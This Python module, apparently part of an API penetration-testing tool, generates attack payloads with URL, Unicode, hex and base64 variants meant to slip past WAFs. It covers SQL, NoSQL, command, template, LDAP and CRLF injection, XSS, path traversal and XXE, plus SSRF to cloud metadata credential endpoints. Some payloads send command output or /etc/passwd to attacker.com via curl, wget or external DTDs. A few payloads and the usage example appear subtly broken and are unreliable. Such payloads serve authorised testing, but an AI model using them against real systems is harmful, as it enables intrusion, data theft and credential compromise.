"""
Advanced payload generator with encoding variants and WAF bypass patterns.

This module provides PayloadGenerator which creates attack payloads with
multiple encoding variants to bypass WAFs and input filters. Payloads are
organized by attack type and include severity indicators.

Usage:
    from api_pentest.core.payload_generator import PayloadGenerator, AttackType

    gen = PayloadGenerator()

    # Get SQL injection payloads
    for payload in gen.generate(AttackType.SQLI, context="string"):
        print(payload.value, payload.encoded_variants)

    # Get SSRF payloads for specific target
    for payload in gen.ssrf_payloads(internal_ip="169.254.169.254"):
        print(payload.value)
"""

import base64
import logging
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Iterator

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks for payload categorization."""
    SQLI = auto()           # SQL Injection
    NOSQLI = auto()         # NoSQL Injection
    CMDI = auto()           # Command Injection
    XSS = auto()            # Cross-Site Scripting
    SSTI = auto()           # Server-Side Template Injection
    SSRF = auto()           # Server-Side Request Forgery
    PATH_TRAVERSAL = auto() # Path/Directory Traversal
    XXE = auto()            # XML External Entity
    LDAP = auto()           # LDAP Injection
    CRLF = auto()           # CRLF Injection
    IDOR = auto()           # IDOR test values


class PayloadSeverity(Enum):
    """Impact level if payload succeeds."""
    INFO = "info"           # Information disclosure
    LOW = "low"             # Minor security issue
    MEDIUM = "medium"       # Moderate security issue
    HIGH = "high"           # Serious vulnerability
    CRITICAL = "critical"   # Severe vulnerability


@dataclass
class Payload:
    """A single attack payload with metadata."""
    value: str
    attack_type: AttackType
    severity: PayloadSeverity
    description: str
    detection_pattern: str = ""  # Regex to detect successful exploitation
    encoded_variants: list[str] = field(default_factory=list)
    bypass_target: str = ""  # What this bypasses (e.g., "basic filter", "waf")
    context: str = ""  # Where payload is effective (string, numeric, etc)


class PayloadGenerator:
    """Generates attack payloads with encoding variants for WAF bypass.

    Provides payloads for various attack types with multiple encoding
    variants to bypass input filters and WAFs. Each payload includes
    metadata about severity and detection patterns.
    """

    def __init__(self, encode_level: int = 2):
        """Initialize PayloadGenerator.

        Args:
            encode_level: How many encoding variants to generate (0-3)
                0 = No encoding, base payloads only
                1 = URL encoding only
                2 = URL + Unicode encoding
                3 = All variants (double encoding, mixed case, etc)
        """
        self.encode_level = encode_level

    def generate(self, attack_type: AttackType, context: str = "string") -> Iterator[Payload]:
        """Generate payloads for a specific attack type.

        Args:
            attack_type: Type of attack
            context: Where payload will be used (string, numeric, json, etc)

        Yields:
            Payload objects with encoded variants
        """
        generators = {
            AttackType.SQLI: self._sqli_payloads,
            AttackType.NOSQLI: self._nosqli_payloads,
            AttackType.CMDI: self._cmdi_payloads,
            AttackType.XSS: self._xss_payloads,
            AttackType.SSTI: self._ssti_payloads,
            AttackType.SSRF: self._ssrf_payloads,
            AttackType.PATH_TRAVERSAL: self._traversal_payloads,
            AttackType.XXE: self._xxe_payloads,
            AttackType.LDAP: self._ldap_payloads,
            AttackType.CRLF: self._crlf_payloads,
        }

        generator = generators.get(attack_type)
        if generator:
            for payload in generator(context):
                payload.encoded_variants = self._encode_variants(payload.value)
                yield payload

    def _encode_variants(self, value: str) -> list[str]:
        """Generate encoding variants of a payload."""
        variants = []

        if self.encode_level >= 1:
            # URL encoding
            variants.append(urllib.parse.quote(value, safe=''))

        if self.encode_level >= 2:
            # Double URL encoding
            variants.append(urllib.parse.quote(urllib.parse.quote(value, safe=''), safe=''))

            # Unicode encoding (for WAF bypass)
            unicode_encoded = self._unicode_encode(value)
            if unicode_encoded != value:
                variants.append(unicode_encoded)

        if self.encode_level >= 3:
            # Mixed case (for case-insensitive filters)
            variants.append(self._mixed_case(value))

            # HTML entity encoding
            variants.append(self._html_encode(value))

            # Base64 (some apps decode this)
            variants.append(base64.b64encode(value.encode()).decode())

            # Hex encoding
            variants.append(''.join(f'%{ord(c):02x}' for c in value))

        return variants

    def _unicode_encode(self, value: str) -> str:
        """Convert characters to Unicode escape sequences."""
        result = []
        for char in value:
            if char in "'\"\\ ":
                result.append(f'\\u{ord(char):04x}')
            else:
                result.append(char)
        return ''.join(result)

    def _mixed_case(self, value: str) -> str:
        """Generate mixed case variant."""
        result = []
        for i, char in enumerate(value):
            if char.isalpha():
                result.append(char.upper() if i % 2 else char.lower())
            else:
                result.append(char)
        return ''.join(result)

    def _html_encode(self, value: str) -> str:
        """HTML entity encode special characters."""
        entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
        }
        result = value
        for char, entity in entities.items():
            result = result.replace(char, entity)
        return result

    # =========================================================================
    # SQL Injection Payloads
    # =========================================================================

    def _sqli_payloads(self, context: str) -> Iterator[Payload]:
        """Generate SQL injection payloads."""

        # Classic string-based
        string_payloads = [
            ("'", "Single quote - basic test", "error|syntax|sql"),
            ("''", "Double single quote", ""),
            ("' OR '1'='1", "Always true condition", ""),
            ("' OR '1'='1'--", "Always true with comment", ""),
            ("' OR '1'='1'/*", "Always true with block comment", ""),
            ("' OR 1=1--", "Numeric comparison", ""),
            ("' AND '1'='2", "Always false (baseline)", ""),
            ("1' ORDER BY 1--", "UNION column count", ""),
            ("1' ORDER BY 100--", "UNION column count (high)", "error|Unknown column"),
            ("' UNION SELECT NULL--", "UNION injection", ""),
            ("' UNION SELECT NULL,NULL--", "UNION 2 columns", ""),
            ("'; DROP TABLE users--", "Destructive (don't exec)", ""),
        ]

        # Time-based blind
        time_payloads = [
            ("' OR SLEEP(5)--", "MySQL time-based blind", ""),
            ("'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based blind", ""),
            ("' OR pg_sleep(5)--", "PostgreSQL time-based blind", ""),
            ("1; SELECT SLEEP(5)", "Stacked query sleep", ""),
        ]

        # Error-based
        error_payloads = [
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "MySQL error-based", ""),
            ("' AND 1=CONVERT(int,@@version)--", "MSSQL error-based", ""),
            ("'||(SELECT 1 FROM dual WHERE 1=1)||'", "Oracle concatenation", ""),
        ]

        # Out-of-band
        oob_payloads = [
            ("'; EXEC xp_dirtree '\\\\attacker.com\\share'--", "MSSQL OOB", ""),
            ("' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\share')--", "MySQL OOB", ""),
        ]

        # WAF bypass variants
        bypass_payloads = [
            ("'/**/OR/**/1=1--", "Comment bypass", ""),
            ("' oR 1=1--", "Case variation", ""),
            ("'%00OR 1=1--", "Null byte bypass", ""),
            ("' /*!50000OR*/ 1=1--", "MySQL version comment", ""),
            ("'+OR+'1'='1", "Plus instead of space", ""),
            ("'%09OR%091=1--", "Tab instead of space", ""),
            ("'-1' OR '1'='1", "Negative number prefix", ""),
            ("admin'--", "Comment out password check", ""),
            ("' OR ''='", "Empty string comparison", ""),
        ]

        all_payloads = (
            [(p, PayloadSeverity.HIGH) for p in string_payloads] +
            [(p, PayloadSeverity.HIGH) for p in time_payloads] +
            [(p, PayloadSeverity.HIGH) for p in error_payloads] +
            [(p, PayloadSeverity.CRITICAL) for p in oob_payloads] +
            [(p, PayloadSeverity.HIGH) for p in bypass_payloads]
        )

        for (value, desc, pattern), severity in all_payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.SQLI,
                severity=severity,
                description=desc,
                detection_pattern=pattern,
                context=context,
            )

    # =========================================================================
    # NoSQL Injection Payloads
    # =========================================================================

    def _nosqli_payloads(self, context: str) -> Iterator[Payload]:
        """Generate NoSQL injection payloads (MongoDB focused)."""

        payloads = [
            # Query operator injection
            ('{"$gt": ""}', "Greater than empty string", PayloadSeverity.HIGH),
            ('{"$ne": null}', "Not equal null", PayloadSeverity.HIGH),
            ('{"$ne": ""}', "Not equal empty", PayloadSeverity.HIGH),
            ('{"$regex": ".*"}', "Regex match all", PayloadSeverity.HIGH),
            ('{"$where": "1==1"}', "Where clause injection", PayloadSeverity.CRITICAL),
            ('{"$where": "sleep(5000)"}', "Time-based blind", PayloadSeverity.HIGH),

            # URL-encoded variants for query params
            ('[$gt]=', "Array syntax $gt", PayloadSeverity.HIGH),
            ('[$ne]=', "Array syntax $ne", PayloadSeverity.HIGH),
            ('[$regex]=.*', "Array syntax regex", PayloadSeverity.HIGH),

            # JavaScript injection
            ("';return true;'", "JS return true", PayloadSeverity.HIGH),
            ('";return true;//', "JS with comment", PayloadSeverity.HIGH),
            ("'||'1'=='1", "JS OR condition", PayloadSeverity.HIGH),

            # Prototype pollution
            ('{"__proto__": {"admin": true}}', "Prototype pollution", PayloadSeverity.CRITICAL),
            ('{"constructor": {"prototype": {"admin": true}}}', "Constructor pollution", PayloadSeverity.CRITICAL),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.NOSQLI,
                severity=severity,
                description=desc,
                context=context,
            )

    # =========================================================================
    # Command Injection Payloads
    # =========================================================================

    def _cmdi_payloads(self, context: str) -> Iterator[Payload]:
        """Generate OS command injection payloads."""

        payloads = [
            # Basic command separators
            ("; id", "Semicolon separator", PayloadSeverity.CRITICAL),
            ("| id", "Pipe", PayloadSeverity.CRITICAL),
            ("|| id", "OR operator", PayloadSeverity.CRITICAL),
            ("& id", "Background execution", PayloadSeverity.CRITICAL),
            ("&& id", "AND operator", PayloadSeverity.CRITICAL),
            ("`id`", "Backtick substitution", PayloadSeverity.CRITICAL),
            ("$(id)", "Dollar substitution", PayloadSeverity.CRITICAL),
            ("\nid", "Newline separator", PayloadSeverity.CRITICAL),
            ("\r\nid", "CRLF separator", PayloadSeverity.CRITICAL),

            # Time-based detection
            ("; sleep 5", "Unix sleep", PayloadSeverity.CRITICAL),
            ("| sleep 5", "Pipe sleep", PayloadSeverity.CRITICAL),
            ("& ping -c 5 127.0.0.1 &", "Ping delay", PayloadSeverity.CRITICAL),
            ("& timeout /t 5 &", "Windows timeout", PayloadSeverity.CRITICAL),

            # Out-of-band
            ("; curl http://attacker.com/$(whoami)", "OOB curl", PayloadSeverity.CRITICAL),
            ("; nslookup $(whoami).attacker.com", "OOB DNS", PayloadSeverity.CRITICAL),
            ("; wget http://attacker.com/$(id|base64)", "OOB wget", PayloadSeverity.CRITICAL),

            # Bypass techniques
            (";{id}", "Brace expansion", PayloadSeverity.CRITICAL),
            ("';'id", "Quote breaking", PayloadSeverity.CRITICAL),
            ('";id #', "Double quote break", PayloadSeverity.CRITICAL),
            (";$IFS'i'd", "IFS bypass", PayloadSeverity.CRITICAL),
            (";/???/??t /???/p]??wd", "Wildcard bypass", PayloadSeverity.CRITICAL),
            (";i]d", "Bracket bypass", PayloadSeverity.CRITICAL),
            (";{i]d,}", "Brace glob bypass", PayloadSeverity.CRITICAL),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.CMDI,
                severity=severity,
                description=desc,
                detection_pattern=r"uid=\d+|root:|admin:|SYSTEM",
                context=context,
            )

    # =========================================================================
    # XSS Payloads
    # =========================================================================

    def _xss_payloads(self, context: str) -> Iterator[Payload]:
        """Generate XSS payloads (reflected/stored detection)."""

        payloads = [
            # Basic
            ('<script>alert(1)</script>', "Basic script tag", PayloadSeverity.MEDIUM),
            ('"><script>alert(1)</script>', "Attribute breakout", PayloadSeverity.MEDIUM),
            ("'><script>alert(1)</script>", "Single quote breakout", PayloadSeverity.MEDIUM),

            # Event handlers
            ('<img src=x onerror=alert(1)>', "Img onerror", PayloadSeverity.MEDIUM),
            ('<svg onload=alert(1)>', "SVG onload", PayloadSeverity.MEDIUM),
            ('<body onload=alert(1)>', "Body onload", PayloadSeverity.MEDIUM),
            ('<input onfocus=alert(1) autofocus>', "Input autofocus", PayloadSeverity.MEDIUM),

            # Protocol handlers
            ('javascript:alert(1)', "JavaScript protocol", PayloadSeverity.MEDIUM),
            ('data:text/html,<script>alert(1)</script>', "Data URI", PayloadSeverity.MEDIUM),

            # WAF bypass
            ('<scr<script>ipt>alert(1)</scr</script>ipt>', "Nested tag bypass", PayloadSeverity.MEDIUM),
            ('<SCRIPT>alert(1)</SCRIPT>', "Uppercase", PayloadSeverity.MEDIUM),
            ('<ScRiPt>alert(1)</sCrIpT>', "Mixed case", PayloadSeverity.MEDIUM),
            ('<script/src=data:,alert(1)>', "Script src data", PayloadSeverity.MEDIUM),
            ('<svg/onload=alert(1)>', "No space", PayloadSeverity.MEDIUM),
            ('<svg\tonload=alert(1)>', "Tab separator", PayloadSeverity.MEDIUM),
            ('<svg\nonload=alert(1)>', "Newline separator", PayloadSeverity.MEDIUM),

            # Polyglot
            ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", "Polyglot", PayloadSeverity.MEDIUM),

            # DOM-based detection
            ('#<script>alert(1)</script>', "Fragment XSS", PayloadSeverity.LOW),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.XSS,
                severity=severity,
                description=desc,
                detection_pattern=r"<script|onerror=|onload=|javascript:",
                context=context,
            )

    # =========================================================================
    # SSTI Payloads
    # =========================================================================

    def _ssti_payloads(self, context: str) -> Iterator[Payload]:
        """Generate Server-Side Template Injection payloads."""

        payloads = [
            # Detection polyglot
            ('{{7*7}}', "Jinja2/Twig detection", PayloadSeverity.HIGH),
            ('${7*7}', "Freemarker/Spring detection", PayloadSeverity.HIGH),
            ('#{7*7}', "Ruby ERB detection", PayloadSeverity.HIGH),
            ('<%= 7*7 %>', "ERB/JSP detection", PayloadSeverity.HIGH),
            ('${{7*7}}', "Pebble detection", PayloadSeverity.HIGH),
            ('{7*7}', "Velocity detection", PayloadSeverity.HIGH),
            ('{{constructor.constructor("return 1")()}}', "Angular detection", PayloadSeverity.HIGH),

            # Jinja2/Python exploitation
            ("{{config}}", "Jinja2 config disclosure", PayloadSeverity.HIGH),
            ("{{config.items()}}", "Jinja2 config items", PayloadSeverity.HIGH),
            ("{{request.environ}}", "Flask environ", PayloadSeverity.HIGH),
            ("{{''.__class__.__mro__[2].__subclasses__()}}", "Python class enumeration", PayloadSeverity.CRITICAL),
            ("{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}", "Jinja2 file read", PayloadSeverity.CRITICAL),

            # Freemarker
            ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "Freemarker RCE", PayloadSeverity.CRITICAL),

            # Twig
            ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig RCE", PayloadSeverity.CRITICAL),

            # Smarty
            ('{php}echo `id`;{/php}', "Smarty PHP", PayloadSeverity.CRITICAL),
            ('{system("id")}', "Smarty system", PayloadSeverity.CRITICAL),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.SSTI,
                severity=severity,
                description=desc,
                detection_pattern=r"49|config|environ|subclasses|uid=",
                context=context,
            )

    # =========================================================================
    # SSRF Payloads
    # =========================================================================

    def _ssrf_payloads(self, context: str) -> Iterator[Payload]:
        """Generate SSRF payloads for internal network access."""

        # Localhost variations
        localhost_variants = [
            "127.0.0.1",
            "localhost",
            "127.1",
            "127.0.1",
            "0.0.0.0",
            "0",
            "[::1]",
            "2130706433",  # Decimal for 127.0.0.1
            "0x7f000001",  # Hex for 127.0.0.1
            "017700000001",  # Octal
            "127.0.0.1.nip.io",
            "localtest.me",
        ]

        # Cloud metadata endpoints
        cloud_endpoints = [
            ("169.254.169.254", "AWS/Azure/GCP metadata", "/latest/meta-data/"),
            ("169.254.169.254", "AWS IAM credentials", "/latest/meta-data/iam/security-credentials/"),
            ("169.254.169.254", "AWS user data", "/latest/user-data/"),
            ("metadata.google.internal", "GCP metadata", "/computeMetadata/v1/"),
            ("169.254.169.254", "DigitalOcean metadata", "/metadata/v1/"),
            ("100.100.100.200", "Alibaba metadata", "/latest/meta-data/"),
        ]

        # Internal network ranges
        internal_ranges = [
            "10.0.0.1",
            "172.16.0.1",
            "192.168.0.1",
            "192.168.1.1",
        ]

        # Generate localhost payloads
        for variant in localhost_variants:
            yield Payload(
                value=f"http://{variant}/",
                attack_type=AttackType.SSRF,
                severity=PayloadSeverity.HIGH,
                description=f"Localhost via {variant}",
                context=context,
            )
            yield Payload(
                value=f"http://{variant}:22/",
                attack_type=AttackType.SSRF,
                severity=PayloadSeverity.HIGH,
                description=f"Localhost SSH via {variant}",
                context=context,
            )

        # Generate cloud metadata payloads
        for host, desc, path in cloud_endpoints:
            yield Payload(
                value=f"http://{host}{path}",
                attack_type=AttackType.SSRF,
                severity=PayloadSeverity.CRITICAL,
                description=desc,
                context=context,
            )

        # Generate internal network payloads
        for ip in internal_ranges:
            yield Payload(
                value=f"http://{ip}/",
                attack_type=AttackType.SSRF,
                severity=PayloadSeverity.HIGH,
                description=f"Internal network probe {ip}",
                context=context,
            )

        # Protocol smuggling
        protocol_payloads = [
            ("file:///etc/passwd", "File protocol", PayloadSeverity.CRITICAL),
            ("file:///c:/windows/system32/drivers/etc/hosts", "Windows file", PayloadSeverity.CRITICAL),
            ("dict://127.0.0.1:11211/stats", "Dict protocol (Memcached)", PayloadSeverity.HIGH),
            ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "Gopher Redis", PayloadSeverity.CRITICAL),
            ("sftp://attacker.com/", "SFTP protocol", PayloadSeverity.MEDIUM),
        ]

        for value, desc, severity in protocol_payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.SSRF,
                severity=severity,
                description=desc,
                context=context,
            )

        # Bypass techniques
        bypass_payloads = [
            ("http://127.0.0.1#@evil.com", "Fragment bypass", PayloadSeverity.HIGH),
            ("http://evil.com@127.0.0.1", "Userinfo bypass", PayloadSeverity.HIGH),
            ("http://127.0.0.1%00@evil.com", "Null byte bypass", PayloadSeverity.HIGH),
            ("http://127.1.1.1:80\\@127.2.2.2:80/", "Backslash bypass", PayloadSeverity.HIGH),
            ("http://127。0。0。1/", "Unicode dot bypass", PayloadSeverity.HIGH),
        ]

        for value, desc, severity in bypass_payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.SSRF,
                severity=severity,
                description=desc,
                bypass_target="URL parser",
                context=context,
            )

    # =========================================================================
    # Path Traversal Payloads
    # =========================================================================

    def _traversal_payloads(self, context: str) -> Iterator[Payload]:
        """Generate path traversal payloads."""

        base_traversals = [
            "../",
            "..\\",
            "....//",
            "....\\\\",
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",
            "..%5c",
            "..%c0%af",  # Overlong encoding
            "..%c1%9c",
            ".%2e/",
        ]

        sensitive_files_unix = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
        ]

        sensitive_files_win = [
            "c:\\windows\\system32\\drivers\\etc\\hosts",
            "c:\\windows\\win.ini",
            "c:\\boot.ini",
        ]

        # Generate traversal + file combinations
        for traversal in base_traversals[:5]:  # Limit combinations
            for depth in [3, 5, 8]:
                prefix = traversal * depth
                for file in sensitive_files_unix[:3]:
                    yield Payload(
                        value=f"{prefix}{file}",
                        attack_type=AttackType.PATH_TRAVERSAL,
                        severity=PayloadSeverity.HIGH,
                        description=f"Unix traversal depth {depth}",
                        detection_pattern=r"root:|daemon:|bin:|nobody:",
                        context=context,
                    )

        # Null byte bypass (older systems)
        yield Payload(
            value="../../../etc/passwd%00.jpg",
            attack_type=AttackType.PATH_TRAVERSAL,
            severity=PayloadSeverity.HIGH,
            description="Null byte extension bypass",
            context=context,
        )

    # =========================================================================
    # XXE Payloads
    # =========================================================================

    def _xxe_payloads(self, context: str) -> Iterator[Payload]:
        """Generate XML External Entity payloads."""

        payloads = [
            # Basic file read
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             "Basic XXE file read", PayloadSeverity.CRITICAL),

            # SSRF via XXE
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
             "XXE SSRF to metadata", PayloadSeverity.CRITICAL),

            # Blind XXE
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
             "Blind XXE external DTD", PayloadSeverity.CRITICAL),

            # Parameter entity
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY exfil SYSTEM "http://attacker.com/?x=%xxe;">]><foo>&exfil;</foo>',
             "XXE data exfiltration", PayloadSeverity.CRITICAL),

            # Error-based XXE
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]>',
             "Error-based XXE", PayloadSeverity.HIGH),

            # XInclude
            ('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
             "XInclude attack", PayloadSeverity.CRITICAL),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.XXE,
                severity=severity,
                description=desc,
                detection_pattern=r"root:|daemon:|<!ENTITY",
                context=context,
            )

    # =========================================================================
    # LDAP Injection Payloads
    # =========================================================================

    def _ldap_payloads(self, context: str) -> Iterator[Payload]:
        """Generate LDAP injection payloads."""

        payloads = [
            ("*", "Wildcard", PayloadSeverity.MEDIUM),
            ("*)(uid=*))(|(uid=*", "Filter bypass", PayloadSeverity.HIGH),
            ("*)(|(password=*)", "Password filter bypass", PayloadSeverity.HIGH),
            ("admin)(&)", "Admin filter injection", PayloadSeverity.HIGH),
            ("*)(objectClass=*)", "Object enumeration", PayloadSeverity.MEDIUM),
            ("x]%0d%0a[", "Newline injection", PayloadSeverity.MEDIUM),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.LDAP,
                severity=severity,
                description=desc,
                context=context,
            )

    # =========================================================================
    # CRLF Injection Payloads
    # =========================================================================

    def _crlf_payloads(self, context: str) -> Iterator[Payload]:
        """Generate CRLF injection payloads."""

        payloads = [
            ("%0d%0aSet-Cookie:crlf=injection", "Cookie injection", PayloadSeverity.MEDIUM),
            ("%0d%0aLocation:http://evil.com", "Redirect injection", PayloadSeverity.HIGH),
            ("%0d%0a%0d%0a<script>alert(1)</script>", "Header splitting XSS", PayloadSeverity.HIGH),
            ("\\r\\nSet-Cookie:crlf=test", "Backslash notation", PayloadSeverity.MEDIUM),
            ("%E5%98%8A%E5%98%8DSet-Cookie:crlf=test", "Unicode CRLF", PayloadSeverity.MEDIUM),
            ("%0AHeader-Injection:true", "LF only", PayloadSeverity.MEDIUM),
        ]

        for value, desc, severity in payloads:
            yield Payload(
                value=value,
                attack_type=AttackType.CRLF,
                severity=severity,
                description=desc,
                detection_pattern=r"Set-Cookie:|Location:",
                context=context,
            )


# Convenience function
def get_payloads(attack_type: AttackType, encode_level: int = 2) -> list[Payload]:
    """Get all payloads for an attack type.

    Args:
        attack_type: Type of attack
        encode_level: Encoding complexity (0-3)

    Returns:
        List of Payload objects
    """
    gen = PayloadGenerator(encode_level=encode_level)
    return list(gen.generate(attack_type))
